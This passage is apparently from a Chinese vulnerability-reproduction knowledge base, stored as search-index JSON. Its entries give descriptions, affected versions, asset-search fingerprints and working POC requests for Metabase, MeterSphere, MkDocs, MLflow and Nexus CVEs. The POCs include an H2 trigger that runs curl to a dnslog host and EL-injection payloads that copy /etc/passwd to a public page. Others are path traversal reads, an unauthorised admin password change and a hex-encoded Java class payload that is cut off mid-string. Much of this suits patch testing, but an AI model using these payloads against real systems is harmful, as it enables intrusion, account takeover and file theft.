","date":"0001-01-01","objectID":"/metabase-validate-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-38646/:2:0","tags":null,"title":"","uri":"/metabase-validate-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-38646/"},{"categories":null,"content":"网络测绘 app=\"Metabase\" ","date":"0001-01-01","objectID":"/metabase-validate-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-38646/:3:0","tags":null,"title":"","uri":"/metabase-validate-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-38646/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /api/session/properties POST /api/setup/validate HTTP/1.1 Host: Content-Type: application/json Content-Length: 812 { \"token\": \"e56e2c0f-71bf-4e15-9879-d964f319be69\", \"details\": { \"is_on_demand\": false, \"is_full_sync\": false, \"is_sample\": false, \"cache_ttl\": null, \"refingerprint\": false, \"auto_run_queries\": true, \"schedules\": {}, \"details\": { \"db\": \"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec('curl ecw14d.dnslog.cn')\\n$$--=x\", \"advanced-options\": false, \"ssl\": true }, \"name\": \"an-sec-research-team\", \"engine\": \"h2\" } } ","date":"0001-01-01","objectID":"/metabase-validate-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-38646/:4:0","tags":null,"title":"","uri":"/metabase-validate-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-38646/"},{"categories":null,"content":"MeterSphere customMethod 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/metersphere-custommethod-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/metersphere-custommethod-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 2022年1月5日，知道创宇404积极防御实验团队发现了MeterSphere开源持续测试平台的一处漏洞，并向MeterSphere研发团队进行了反馈。通过该漏洞攻击者可以在未授权的情况下执行远程代码，建议MeterSphere平台用户，尤其是可通过公网访问的用户尽快进行升级修复。 ","date":"0001-01-01","objectID":"/metersphere-custommethod-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/metersphere-custommethod-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 MeterSphere v1.13.0 - v1.16.3 ","date":"0001-01-01","objectID":"/metersphere-custommethod-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/metersphere-custommethod-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"MeterSphere\" ","date":"0001-01-01","objectID":"/metersphere-custommethod-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/metersphere-custommethod-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 根据官方的修复可以看到目前版本的修复版本为删除代码片段 filterChainDefinitionMap.put(\"/plugin/**\", “anon”); https://github.com/metersphere/metersphere/pull/9140/files 查看文件 /backend/src/main/java/io/metersphere/controller/PluginController.java 发送请求包 POST /plugin/customMethod {\"entry\":\"Evil\",\"request\":\"id\"} ","date":"0001-01-01","objectID":"/metersphere-custommethod-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/metersphere-custommethod-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Metersphere file 任意文件读取漏洞 CVE-2023-25573 ","date":"0001-01-01","objectID":"/metersphere-file-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2023-25573/:0:0","tags":null,"title":"","uri":"/metersphere-file-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2023-25573/"},{"categories":null,"content":"漏洞描述 MeterSphere 是一站式开源持续测试平台, 涵盖测试跟踪、接口测试、UI 测试和性能测试等功能，全面兼容 JMeter、Selenium 等主流开源标准。 Metersphere file 接口存在任意文件读取漏洞，攻击者通过接口可以获取敏感文件压缩包。 ","date":"0001-01-01","objectID":"/metersphere-file-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2023-25573/:1:0","tags":null,"title":"","uri":"/metersphere-file-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2023-25573/"},{"categories":null,"content":"漏洞影响 Metersphere \u003c=2.6.2 ","date":"0001-01-01","objectID":"/metersphere-file-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2023-25573/:2:0","tags":null,"title":"","uri":"/metersphere-file-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2023-25573/"},{"categories":null,"content":"网络测绘 body=\"Metersphere\" ","date":"0001-01-01","objectID":"/metersphere-file-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2023-25573/:3:0","tags":null,"title":"","uri":"/metersphere-file-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2023-25573/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC POST /api/jmeter/download/files Content-Type: application/json {\"reportId\":\"pass\",\"bodyFiles\":[{\"id\":\"aaa\",\"name\":\"/etc/passwd\"}]} ","date":"0001-01-01","objectID":"/metersphere-file-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2023-25573/:4:0","tags":null,"title":"","uri":"/metersphere-file-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2023-25573/"},{"categories":null,"content":"MKdocs 任意文件读取漏洞 CVE-2021-40978 ","date":"0001-01-01","objectID":"/mkdocs-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-40978/:0:0","tags":null,"title":"","uri":"/mkdocs-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-40978/"},{"categories":null,"content":"漏洞描述 MKdocs中存在通过 %2e%2e 来遍历目录，读取敏感文件 ","date":"0001-01-01","objectID":"/mkdocs-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-40978/:1:0","tags":null,"title":"","uri":"/mkdocs-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-40978/"},{"categories":null,"content":"漏洞影响 Mkdocs 1.2.2 ","date":"0001-01-01","objectID":"/mkdocs-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-40978/:2:0","tags":null,"title":"","uri":"/mkdocs-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-40978/"},{"categories":null,"content":"网络测绘 title=\"My Docs\" ","date":"0001-01-01","objectID":"/mkdocs-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-40978/:3:0","tags":null,"title":"","uri":"/mkdocs-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-40978/"},{"categories":null,"content":"漏洞复现 主页面 验证POC /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd ","date":"0001-01-01","objectID":"/mkdocs-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-40978/:4:0","tags":null,"title":"","uri":"/mkdocs-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-40978/"},{"categories":null,"content":"MLflow get-artifact 任意文件读取漏洞 CVE-2023-1177 ","date":"0001-01-01","objectID":"/mlflow-get-artifact-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2023-1177/:0:0","tags":null,"title":"","uri":"/mlflow-get-artifact-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2023-1177/"},{"categories":null,"content":"漏洞描述 使用 MLflow 模型注册表托管 MLflow 开源项目的用户 mlflow server或者 mlflow ui使用早于 MLflow 2.2.1 的 MLflow 版本的命令如果不限制谁可以查询其服务器（例如，通过使用云 VPC、入站请求的 IP 白名单或身份验证 /授权中间件）。 此问题仅影响运行 mlflow server和 mlflow ui命令。 不使用的集成 mlflow server或者 mlflow ui不受影响； 例如，Azure Machine Learning 上的 Databricks Managed MLflow 产品和 MLflow 不使用这些命令，并且不会以任何方式受到这些漏洞的影响。 ","date":"0001-01-01","objectID":"/mlflow-get-artifact-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2023-1177/:1:0","tags":null,"title":"","uri":"/mlflow-get-artifact-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2023-1177/"},{"categories":null,"content":"漏洞影响 MLflow \u003c 2.2.1 ","date":"0001-01-01","objectID":"/mlflow-get-artifact-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2023-1177/:2:0","tags":null,"title":"","uri":"/mlflow-get-artifact-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2023-1177/"},{"categories":null,"content":"网络测绘 app.name=\"MLflow\" ","date":"0001-01-01","objectID":"/mlflow-get-artifact-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2023-1177/:3:0","tags":null,"title":"","uri":"/mlflow-get-artifact-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2023-1177/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC POST /ajax-api/2.0/mlflow/registered-models/create Content-Type: application/json {\"name\": \"testfile\"} POST /ajax-api/2.0/mlflow/model-versions/create Content-Type: application/json {\"name\": \"testfile\", \"source\": \"/etc\"} /model-versions/get-artifact?path=passwd\u0026name=testfile\u0026version=1 ","date":"0001-01-01","objectID":"/mlflow-get-artifact-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2023-1177/:4:0","tags":null,"title":"","uri":"/mlflow-get-artifact-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2023-1177/"},{"categories":null,"content":"Nexus Repository Manger change-password 低权限修改管理员密码漏洞 CVE-2020-11444 ","date":"0001-01-01","objectID":"/nexus-repository-manger-change-password-%E4%BD%8E%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E-cve-2020-11444/:0:0","tags":null,"title":"","uri":"/nexus-repository-manger-change-password-%E4%BD%8E%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E-cve-2020-11444/"},{"categories":null,"content":"漏洞描述 Nexus Repository Manger存在低权限修改管理员密码漏洞，低权限用户发送特定的请求包可以修改管理员账号密码 ","date":"0001-01-01","objectID":"/nexus-repository-manger-change-password-%E4%BD%8E%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E-cve-2020-11444/:1:0","tags":null,"title":"","uri":"/nexus-repository-manger-change-password-%E4%BD%8E%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E-cve-2020-11444/"},{"categories":null,"content":"漏洞影响 Nexus 3.x OSS / Pro \u003c= 3.21.1 ","date":"0001-01-01","objectID":"/nexus-repository-manger-change-password-%E4%BD%8E%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E-cve-2020-11444/:2:0","tags":null,"title":"","uri":"/nexus-repository-manger-change-password-%E4%BD%8E%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E-cve-2020-11444/"},{"categories":null,"content":"环境搭建 https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2020-10204 ","date":"0001-01-01","objectID":"/nexus-repository-manger-change-password-%E4%BD%8E%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E-cve-2020-11444/:3:0","tags":null,"title":"","uri":"/nexus-repository-manger-change-password-%E4%BD%8E%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E-cve-2020-11444/"},{"categories":null,"content":"漏洞复现 漏洞触发需要任意账户权限 登录任意用户后修改 NXSESSIONID，发送请求包修改管理员账号密码 PUT /service/rest/beta/security/users/admin/change-password HTTP/1.1 Host: accept: application/json User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.6080434247960143 Content-Type: text/plain Origin: http://139.198.174.173:8081 Cookie: NX-ANTI-CSRF-TOKEN=0.6080434247960143; NXSESSIONID=76b37c99-046c-47a9-ba7d-fd4cfa33b7ff Content-Length: 11 data=123456 返回204则修改成功 ","date":"0001-01-01","objectID":"/nexus-repository-manger-change-password-%E4%BD%8E%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E-cve-2020-11444/:4:0","tags":null,"title":"","uri":"/nexus-repository-manger-change-password-%E4%BD%8E%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E-cve-2020-11444/"},{"categories":null,"content":"Nexus Repository Manger extdirect 后台远程命令执行 CVE-2020-10204 ","date":"0001-01-01","objectID":"/nexus-repository-manger-extdirect-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-10204/:0:0","tags":null,"title":"","uri":"/nexus-repository-manger-extdirect-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-10204/"},{"categories":null,"content":"漏洞描述 Nexus Repository Manager 3 是一款软件仓库，可以用来存储和分发Maven、NuGET等软件源仓库。其3.21.1及之前版本中，存在一处任意EL表达式注入漏洞，这个漏洞是CVE-2018-16621的绕过。 ","date":"0001-01-01","objectID":"/nexus-repository-manger-extdirect-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-10204/:1:0","tags":null,"title":"","uri":"/nexus-repository-manger-extdirect-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-10204/"},{"categories":null,"content":"漏洞影响 Nexus \u003c 3.21.1 ","date":"0001-01-01","objectID":"/nexus-repository-manger-extdirect-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-10204/:2:0","tags":null,"title":"","uri":"/nexus-repository-manger-extdirect-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-10204/"},{"categories":null,"content":"环境搭建 https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2020-10204 ","date":"0001-01-01","objectID":"/nexus-repository-manger-extdirect-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-10204/:3:0","tags":null,"title":"","uri":"/nexus-repository-manger-extdirect-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-10204/"},{"categories":null,"content":"漏洞复现 漏洞触发需要任意账户权限 该漏洞需要访问更新角色或创建角色接口，登录任意用户后修改 NXSESSIONID 发送请求包执行命令 POST /service/extdirect HTTP/1.1 Host: accept: application/json User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.856555763510765 Content-Type: application/json Cookie: jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.856555763510765; NXSESSIONID=e9d6620d-6843-49a6-a887-cd7cef74d413 Content-Length: 304 {\"action\":\"coreui_Role\",\"method\":\"create\",\"data\":[{\"version\":\"\",\"source\":\"default\",\"id\":\"1111\",\"name\":\"2222\",\"description\":\"3333\",\"privileges\":[\"$\\\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('cp /etc/passwd ./public/vuln.html')}\"],\"roles\":[]}],\"type\":\"rpc\",\"tid\":89} 另一处漏洞点 POST /service/extdirect HTTP/1.1 Host: accept: application/json User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.856555763510765 Content-Type: application/json Cookie: jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.856555763510765; NXSESSIONID=e9d6620d-6843-49a6-a887-cd7cef74d413 Content-Length: 304 {\"action\":\"coreui_User\",\"method\":\"update\",\"data\":[{\"userId\":\"www\",\"version\":\"2\",\"firstName\":\"www\",\"lastName\":\"www\",\"email\":\"www@qq.com\",\"status\":\"active\",\"roles\":[\"$\\\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('cp /etc/passwd ./public/vuln.html')}\"]}],\"type\":\"rpc\",\"tid\":9} 访问 vuln.html ","date":"0001-01-01","objectID":"/nexus-repository-manger-extdirect-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-10204/:4:0","tags":null,"title":"","uri":"/nexus-repository-manger-extdirect-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-10204/"},{"categories":null,"content":"Nexus Repository Manger extdirect 远程命令执行 CVE-2019-7238 ","date":"0001-01-01","objectID":"/nexus-repository-manger-extdirect-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2019-7238/:0:0","tags":null,"title":"","uri":"/nexus-repository-manger-extdirect-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2019-7238/"},{"categories":null,"content":"漏洞描述 近日，研究人员发现了通用软件包仓库管理服务 Nexus Repository Manager 3 存在访问控制缺失及远程代码执行漏洞，漏洞编号为 CVE-2019-7238 ","date":"0001-01-01","objectID":"/nexus-repository-manger-extdirect-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2019-7238/:1:0","tags":null,"title":"","uri":"/nexus-repository-manger-extdirect-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2019-7238/"},{"categories":null,"content":"漏洞影响 Nexus \u003c 3.14.0 ","date":"0001-01-01","objectID":"/nexus-repository-manger-extdirect-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2019-7238/:2:0","tags":null,"title":"","uri":"/nexus-repository-manger-extdirect-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2019-7238/"},{"categories":null,"content":"环境搭建 https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2019-7238 ","date":"0001-01-01","objectID":"/nexus-repository-manger-extdirect-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2019-7238/:3:0","tags":null,"title":"","uri":"/nexus-repository-manger-extdirect-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2019-7238/"},{"categories":null,"content":"网络测绘 app=“Nexus-Repository-Manager” ","date":"0001-01-01","objectID":"/nexus-repository-manger-extdirect-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2019-7238/:4:0","tags":null,"title":"","uri":"/nexus-repository-manger-extdirect-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2019-7238/"},{"categories":null,"content":"漏洞复现 后台页面如下，任意上传 jar包 发送请求包执行命令 POST /service/extdirect HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0 Accept: */* Content-Type: application/json X-Requested-With: XMLHttpRequest Content-Length: 7256 Connection: close {\"action\": \"coreui_Component\", \"type\": \"rpc\", \"tid\": 8, \"data\": [{\"sort\": [{\"direction\": \"ASC\", \"property\": \"name\"}], \"start\": 0, \"filter\": [{\"property\": \"repositoryName\", \"value\": \"*\"}, {\"property\": \"expression\", \"value\": \"function(x, y, z, c, integer, defineClass){ c=1.class.forName('java.lang.Character'); integer=1.class; x='cafebabe0000003100ae0a001f00560a005700580a005700590a005a005b0a005a005c0a005d005e0a005d005f0700600a000800610a006200630700640800650a001d00660800410a001d00670a006800690a0068006a08006b08004508006c08006d0a006e006f0a006e00700a001f00710a001d00720800730a000800740800750700760a001d00770700780a0079007a08007b08007c07007d0a0023007e0a0023007f0700800100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100114c4578706c6f69742f546573743233343b01000474657374010015284c6a6176612f6c616e672f537472696e673b29560100036f626a0100124c6a6176612f6c616e672f4f626a6563743b0100016901000149010003636d640100124c6a6176612f6c616e672f537472696e673b01000770726f636573730100134c6a6176612f6c616e672f50726f636573733b01000269730100154c6a6176612f696f2f496e70757453747265616d3b010006726573756c740100025b42010009726573756c745374720100067468726561640100124c6a6176612f6c616e672f5468726561643b0100056669656c640100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000c7468726561644c6f63616c7301000e7468726561644c6f63616c4d61700100114c6a6176612f6c616e672f436c6173733b01000a7461626c654669656c640100057461626c65010005656e74727901000a76616c75654669656c6401000e68747470436f6e6e656374696f6e01000e48747470436f6e6e656374696f6e0100076368616e6e656c01000b487474704368616e6e656c010008726573706f6e7365010008526573706f6e73650100067772697465720100154c6a6176612f696f2f5072696e745772697465723b0100164c6f63616c5661726961626c65547970655461626c650100144c6a6176612f6c616e672f436c6173733c2a3e3b01000a457863657074696f6e7307008101000a536f7572636546696c6501000c546573743233342e6a6176610c002700280700820c008300840c008500860700870c008800890c008a008b07008c0c008d00890c008e008f0100106a6176612f6c616e672f537472696e670c002700900700910c009200930100116a6176612f6c616e672f496e74656765720100106a6176612e6c616e672e5468726561640c009400950c009600970700980c0099009a0c009b009c0100246a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617001002a6a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617024456e74727901000576616c756507009d0c009e009f0c009b00a00c00a100a20c00a300a40100276f72672e65636c697073652e6a657474792e7365727665722e48747470436f6e6e656374696f6e0c00a500a601000e676574487474704368616e6e656c01000f6a6176612f6c616e672f436c6173730c00a700a80100106a6176612f6c616e672f4f626a6563740700a90c00aa00ab01000b676574526573706f6e73650100096765745772697465720100136a6176612f696f2f5072696e745772697465720c00ac002f0c00ad002801000f4578706c6f69742f546573743233340100136a6176612f6c616e672f457863657074696f6e0100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000777616974466f7201000328294901000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0100136a6176612f696f2f496e70757453747265616d010009617661696c61626c6501000472656164010007285b4249492949010005285b4229560100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b010007666f724e616d65010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c6","date":"0001-01-01","objectID":"/nexus-repository-manger-extdirect-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2019-7238/:5:0","tags":null,"title":"","uri":"/nexus-repository-manger-extdirect-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2019-7238/"},{"categories":null,"content":"Nexus Repository Manger group 后台远程命令执行 CVE-2020-10199 ","date":"0001-01-01","objectID":"/nexus-repository-manger-group-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-10199/:0:0","tags":null,"title":"","uri":"/nexus-repository-manger-group-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-10199/"},{"categories":null,"content":"漏洞描述 Nexus 后台存在一处任意EL表达式注入漏洞，只需要任意一个用户权限即可 